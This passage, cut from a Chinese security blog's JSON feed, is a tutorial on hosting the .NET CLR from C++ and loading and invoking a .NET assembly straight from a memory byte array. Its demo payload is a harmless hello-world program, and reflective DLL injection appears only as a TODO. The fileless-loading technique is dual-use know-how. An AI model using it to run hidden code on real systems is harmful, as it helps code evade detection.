operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>iRuntimeHost<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    iRuntimeHost<span class=\"token operator\">-&gt;</span><span class=\"token function\">Start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">//执行</span>\n    iRuntimeHost<span class=\"token operator\">-&gt;</span><span class=\"token function\">ExecuteInDefaultAppDomain</span><span class=\"token punctuation\">(</span>L<span class=\"token string\">\"C:\\\\TEST.exe\"</span><span class=\"token punctuation\">,</span> L<span class=\"token string\">\"TEST.Program\"</span><span class=\"token punctuation\">,</span> L<span class=\"token string\">\"print\"</span><span class=\"token punctuation\">,</span> L<span class=\"token string\">\"test\"</span><span class=\"token punctuation\">,</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">//释放</span>\n    iRuntimeInfo<span class=\"token operator\">-&gt;</span><span class=\"token function\">Release</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    iMetaHost<span class=\"token operator\">-&gt;</span><span class=\"token function\">Release</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    iRuntimeHost<span class=\"token operator\">-&gt;</span><span class=\"token function\">Release</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>执行的C#源码</p>\n<div class=\"language-csharp\" data-ext=\"cs\" data-title=\"cs\"><pre class=\"language-csharp\"><code><span class=\"token keyword\">using</span> <span class=\"token namespace\">System</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">namespace</span> <span class=\"token namespace\">TEST</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">class</span> <span class=\"token class-name\">Program</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">static</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">int</span></span> <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></span> args<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{</span>\n\n            <span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">static</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">int</span></span> <span class=\"token function\">print</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> strings<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{</span>\n            Console<span class=\"token punctuation\">.</span><span class=\"token function\">WriteLine</span><span class=\"token punctuation\">(</span>strings<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>2.4. 内存加载执行.NET程序集</h3>\n<p>1.初始化CLR环境(同上)</p>\n<div class=\"language-cpp\" data-ext=\"cpp\" data-title=\"cpp\"><pre class=\"language-cpp\"><code>\t<span class=\"token function\">CLRCreateInstance</span><span class=\"token punctuation\">(</span>CLSID_CLRMetaHost<span class=\"token punctuation\">,</span> IID_ICLRMetaHost<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>VOID<span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>iMetaHost<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tiMetaHost<span class=\"token operator\">-&gt;</span><span class=\"token function\">GetRuntime</span><span class=\"token punctuation\">(</span>L<span class=\"token string\">\"v4.0.30319\"</span><span class=\"token punctuation\">,</span> IID_ICLRRuntimeInfo<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>VOID<span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>iRuntimeInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tiRuntimeInfo<span class=\"token operator\">-&gt;</span><span class=\"token function\">GetInterface</span><span class=\"token punctuation\">(</span>CLSID_CorRuntimeHost<span class=\"token punctuation\">,</span> IID_ICorRuntimeHost<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>VOID<span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>iRuntimeHost<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tiRuntimeHost<span class=\"token operator\">-&gt;</span><span class=\"token function\">Start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>2.通过ICLRRuntimeHost获取AppDomain接口指针，然后通过AppDomain接口的QueryInterface方法来查询默认应用程序域的实例指针。</p>\n<div class=\"language-cpp\" data-ext=\"cpp\" data-title=\"cpp\"><pre class=\"language-cpp\"><code>\tiRuntimeHost<span class=\"token operator\">-&gt;</span><span class=\"token function\">GetDefaultDomain</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>pAppDomain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tpAppDomain<span class=\"token operator\">-&gt;</span><span class=\"token function\">QueryInterface</span><span class=\"token punctuation\">(</span><span class=\"token function\">__uuidof</span><span class=\"token punctuation\">(</span>_AppDomain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>VOID<span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>pDefaultAppDomain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>3.通过默认应用程序域实例的Load_3方法加载安全.net程序集数组，并返回Assembly的实例对象指针，通过Assembly实例对象的get_EntryPoint方法获取描述入口点的MethodInfo实例对象。</p>\n<div class=\"language-cpp\" data-ext=\"cpp\" data-title=\"cpp\"><pre class=\"language-cpp\"><code>\tsaBound<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>cElements <span class=\"token operator\">=</span> ASSEMBLY_LENGTH<span class=\"token punctuation\">;</span>\n\tsaBound<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>lLbound <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\tSAFEARRAY<span class=\"token operator\">*</span> pSafeArray <span class=\"token operator\">=</span> <span class=\"token function\">SafeArrayCreate</span><span class=\"token punctuation\">(</span>VT_UI1<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> saBound<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token function\">SafeArrayAccessData</span><span class=\"token punctuation\">(</span>pSafeArray<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>pData<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>pData<span class=\"token punctuation\">,</span> dotnetRaw<span class=\"token punctuation\">,</span> ASSEMBLY_LENGTH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">SafeArrayUnaccessData</span><span class=\"token punctuation\">(</span>pSafeArray<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\tpDefaultAppDomain<span class=\"token operator\">-&gt;</span><span class=\"token function\">Load_3</span><span class=\"token punctuation\">(</span>pSafeArray<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>pAssembly<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tpAssembly<span class=\"token operator\">-&gt;</span><span class=\"token function\">get_EntryPoint</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>pMethodInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>4.创建参数安全数组</p>\n<div class=\"language-cpp\" data-ext=\"cpp\" data-title=\"cpp\"><pre class=\"language-cpp\"><code><span class=\"token function\">ZeroMemory</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>vRet<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>VARIANT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">ZeroMemory</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>vObj<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>VARIANT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tvObj<span class=\"token punctuation\">.</span>vt <span class=\"token operator\">=</span> VT_NULL<span class=\"token punctuation\">;</span>\n\n\tvPsa<span class=\"token punctuation\">.</span>vt <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>VT_ARRAY <span class=\"token operator\">|</span> VT_BSTR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\targs <span class=\"token operator\">=</span> <span class=\"token function\">SafeArrayCreateVector</span><span class=\"token punctuation\">(</span>VT_VARIANT<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>argc <span class=\"token operator\">&gt;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\tvPsa<span class=\"token punctuation\">.</span>parray <span class=\"token operator\">=</span> <span class=\"token function\">SafeArrayCreateVector</span><span class=\"token punctuation\">(</span>VT_BSTR<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> argc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> argc<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token function\">SafeArrayPutElement</span><span class=\"token punctuation\">(</span>vPsa<span class=\"token punctuation\">.</span>parray<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>i<span class=\"token punctuation\">,</span> <span class=\"token function\">SysAllocString</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span>\n\n\t\t<span class=\"token keyword\">long</span> idx<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">SafeArrayPutElement</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>vPsa<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n</code></pre></div><p>5.通过描述入口点的MethodInfo实例对象的Invoke方法执行入口点。</p>\n<div class=\"language-cpp\" data-ext=\"cpp\" data-title=\"cpp\"><pre class=\"language-cpp\"><code>HRESULT hr <span class=\"token operator\">=</span> pMethodInfo<span class=\"token operator\">-&gt;</span><span class=\"token function\">Invoke_3</span><span class=\"token punctuation\">(</span>vObj<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>vRet<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><h4>示例代码</h4>\n<div class=\"language-cpp\" data-ext=\"cpp\" data-title=\"cpp\"><pre class=\"language-cpp\"><code><span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;tchar.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;metahost.h&gt;</span></span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">pragma</span> <span class=\"token expression\"><span class=\"token function\">comment</span><span class=\"token punctuation\">(</span>lib<span class=\"token punctuation\">,</span> </span><span class=\"token string\">\"mscoree.lib\"</span><span class=\"token expression\"><span class=\"token punctuation\">)</span></span></span>\n\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">import</span> <span class=\"token expression\"><span class=\"token operator\">&lt;</span>mscorlib<span class=\"token punctuation\">.</span>tlb<span class=\"token operator\">&gt;</span> raw_interfaces_only\t\t\t</span><span class=\"token punctuation\">\\</span>\n    \t<span class=\"token expression\"><span class=\"token function\">high_property_prefixes</span><span class=\"token punctuation\">(</span></span><span class=\"token string\">\"_get\"</span><span class=\"token expression\"><span class=\"token punctuation\">,</span></span><span class=\"token string\">\"_put\"</span><span class=\"token expression\"><span class=\"token punctuation\">,</span></span><span class=\"token string\">\"_putref\"</span><span class=\"token expression\"><span class=\"token punctuation\">)</span>\t\t</span><span class=\"token punctuation\">\\</span>\n    \t<span class=\"token expression\"><span class=\"token function\">rename</span><span class=\"token punctuation\">(</span></span><span class=\"token string\">\"ReportEvent\"</span><span class=\"token expression\"><span class=\"token punctuation\">,</span> </span><span class=\"token string\">\"InteropServices_ReportEvent\"</span><span class=\"token expression\"><span class=\"token punctuation\">)</span>\t</span><span class=\"token punctuation\">\\</span>\n\t<span class=\"token expression\"><span class=\"token function\">rename</span><span class=\"token punctuation\">(</span></span><span class=\"token string\">\"or\"</span><span class=\"token expression\"><span class=\"token punctuation\">,</span> </span><span class=\"token string\">\"InteropServices_or\"</span><span class=\"token expression\"><span class=\"token punctuation\">)</span></span></span>\n\n<span class=\"token keyword\">using</span> <span class=\"token keyword\">namespace</span> mscorlib<span class=\"token punctuation\">;</span>\n<span class=\"token macro property\"><span class=\"token directive-hash\">#</span><span class=\"token directive keyword\">define</span> <span class=\"token macro-name\">ASSEMBLY_LENGTH</span>  <span class=\"token expression\"><span class=\"token number\">8192</span></span></span>\n\n\n<span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">char</span> dotnetRaw<span class=\"token punctuation\">[</span><span class=\"token number\">8192</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span>\n<span class=\"token string\">\"\\x4d\\x5a\\x90\\x00\\x03\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\xff\\xff\\x00...\"</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//.net程序集字节数组</span>\n\n\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">_tmain</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> _TCHAR<span class=\"token operator\">*</span> argv<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n\n\tICLRMetaHost<span class=\"token operator\">*</span> iMetaHost <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>\n\tICLRRuntimeInfo<span class=\"token operator\">*</span> iRuntimeInfo <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>\n\tICorRuntimeHost<span class=\"token operator\">*</span> iRuntimeHost <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>\n\tIUnknownPtr pAppDomain <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>\n\t_AppDomainPtr pDefaultAppDomain <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>\n\t_AssemblyPtr pAssembly <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>\n\t_MethodInfoPtr pMethodInfo <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>\n\tSAFEARRAYBOUND saBound<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token keyword\">void</span><span class=\"token operator\">*</span> pData <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>\n\tVARIANT vRet<span class=\"token punctuation\">;</span>\n\tVARIANT vObj<span class=\"token punctuation\">;</span>\n\tVARIANT vPsa<span class=\"token punctuation\">;</span>\n\tSAFEARRAY<span class=\"token operator\">*</span> args <span class=\"token operator\">=</span> <span class=\"token constant\">NULL</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token function\">CLRCreateInstance</span><span class=\"token punctuation\">(</span>CLSID_CLRMetaHost<span class=\"token punctuation\">,</span> IID_ICLRMetaHost<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>VOID<span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>iMetaHost<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tiMetaHost<span class=\"token operator\">-&gt;</span><span class=\"token function\">GetRuntime</span><span class=\"token punctuation\">(</span>L<span class=\"token string\">\"v4.0.30319\"</span><span class=\"token punctuation\">,</span> IID_ICLRRuntimeInfo<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>VOID<span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>iRuntimeInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tiRuntimeInfo<span class=\"token operator\">-&gt;</span><span class=\"token function\">GetInterface</span><span class=\"token punctuation\">(</span>CLSID_CorRuntimeHost<span class=\"token punctuation\">,</span> IID_ICorRuntimeHost<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>VOID<span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>iRuntimeHost<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tiRuntimeHost<span class=\"token operator\">-&gt;</span><span class=\"token function\">Start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\n\tiRuntimeHost<span class=\"token operator\">-&gt;</span><span class=\"token function\">GetDefaultDomain</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>pAppDomain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tpAppDomain<span class=\"token operator\">-&gt;</span><span class=\"token function\">QueryInterface</span><span class=\"token punctuation\">(</span><span class=\"token function\">__uuidof</span><span class=\"token punctuation\">(</span>_AppDomain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>VOID<span class=\"token operator\">*</span><span class=\"token operator\">*</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;</span>pDefaultAppDomain<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\tsaBound<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>cElements <span class=\"token operator\">=</span> ASSEMBLY_LENGTH<span class=\"token punctuation\">;</span>\n\tsaBound<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>lLbound <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n\tSAFEARRAY<span class=\"token operator\">*</span> pSafeArray <span class=\"token operator\">=</span> <span class=\"token function\">SafeArrayCreate</span><span class=\"token punctuation\">(</span>VT_UI1<span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> saBound<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token function\">SafeArrayAccessData</span><span class=\"token punctuation\">(</span>pSafeArray<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>pData<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">memcpy</span><span class=\"token punctuation\">(</span>pData<span class=\"token punctuation\">,</span> dotnetRaw<span class=\"token punctuation\">,</span> ASSEMBLY_LENGTH<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">SafeArrayUnaccessData</span><span class=\"token punctuation\">(</span>pSafeArray<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\tpDefaultAppDomain<span class=\"token operator\">-&gt;</span><span class=\"token function\">Load_3</span><span class=\"token punctuation\">(</span>pSafeArray<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>pAssembly<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tpAssembly<span class=\"token operator\">-&gt;</span><span class=\"token function\">get_EntryPoint</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>pMethodInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token function\">ZeroMemory</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>vRet<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>VARIANT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">ZeroMemory</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>vObj<span class=\"token punctuation\">,</span> <span class=\"token keyword\">sizeof</span><span class=\"token punctuation\">(</span>VARIANT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tvObj<span class=\"token punctuation\">.</span>vt <span class=\"token operator\">=</span> VT_NULL<span class=\"token punctuation\">;</span>\n\n\n\n\tvPsa<span class=\"token punctuation\">.</span>vt <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>VT_ARRAY <span class=\"token operator\">|</span> VT_BSTR<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\targs <span class=\"token operator\">=</span> <span class=\"token function\">SafeArrayCreateVector</span><span class=\"token punctuation\">(</span>VT_VARIANT<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>argc <span class=\"token operator\">&gt;</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">{</span>\n\t\tvPsa<span class=\"token punctuation\">.</span>parray <span class=\"token operator\">=</span> <span class=\"token function\">SafeArrayCreateVector</span><span class=\"token punctuation\">(</span>VT_BSTR<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> argc<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">long</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> argc<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n\t\t<span class=\"token punctuation\">{</span>\n\t\t\t<span class=\"token function\">SafeArrayPutElement</span><span class=\"token punctuation\">(</span>vPsa<span class=\"token punctuation\">.</span>parray<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>i<span class=\"token punctuation\">,</span> <span class=\"token function\">SysAllocString</span><span class=\"token punctuation\">(</span>argv<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token punctuation\">}</span>\n\n\t\t<span class=\"token keyword\">long</span> idx<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\t\t<span class=\"token function\">SafeArrayPutElement</span><span class=\"token punctuation\">(</span>args<span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>vPsa<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token punctuation\">}</span>\n\n\tHRESULT hr <span class=\"token operator\">=</span> pMethodInfo<span class=\"token operator\">-&gt;</span><span class=\"token function\">Invoke_3</span><span class=\"token punctuation\">(</span>vObj<span class=\"token punctuation\">,</span> args<span class=\"token punctuation\">,</span> <span class=\"token operator\">&amp;</span>vRet<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tpMethodInfo<span class=\"token operator\">-&gt;</span><span class=\"token function\">Release</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tpAssembly<span class=\"token operator\">-&gt;</span><span class=\"token function\">Release</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tpDefaultAppDomain<span class=\"token operator\">-&gt;</span><span class=\"token function\">Release</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tiRuntimeInfo<span class=\"token operator\">-&gt;</span><span class=\"token function\">Release</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tiMetaHost<span class=\"token operator\">-&gt;</span><span class=\"token function\">Release</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token function\">CoUninitialize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n\t<span class=\"token keyword\">return</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n</code></pre></div><p>执行的C#源码</p>\n<div class=\"language-csharp\" data-ext=\"cs\" data-title=\"cs\"><pre class=\"language-csharp\"><code><span class=\"token keyword\">using</span> <span class=\"token namespace\">System</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">namespace</span> <span class=\"token namespace\">TEST</span>\n<span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">class</span> <span class=\"token class-name\">Program</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">static</span> <span class=\"token return-type class-name\"><span class=\"token keyword\">int</span></span> <span class=\"token function\">Main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></span> args<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">{</span>\n            Console<span class=\"token punctuation\">.</span><span class=\"token function\">WriteLine</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello world!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\"><span class=\"token keyword\">var</span></span> s <span class=\"token keyword\">in</span> args<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">{</span>\n                Console<span class=\"token punctuation\">.</span><span class=\"token function\">WriteLine</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n            <span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h2>3. managed代码内存加载执行PE文件</h2>\n<p>需要自己实现PE加载器</p>\n<h2>4. unmanaged代码内存加载执行PE文件</h2>\n<p>需要自己实现PE加载器</p>\n<p>TODO:反射dll注入</p>\n",
      "date_published": "2024-11-13T10:11:39.000Z",
      "date_modified": "2024-12-09T04:38:06.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "Go语言常见漏洞",
      "url": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/4-GoVul/GoVul.html",
      "id": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/4-GoVul/GoVul.html",
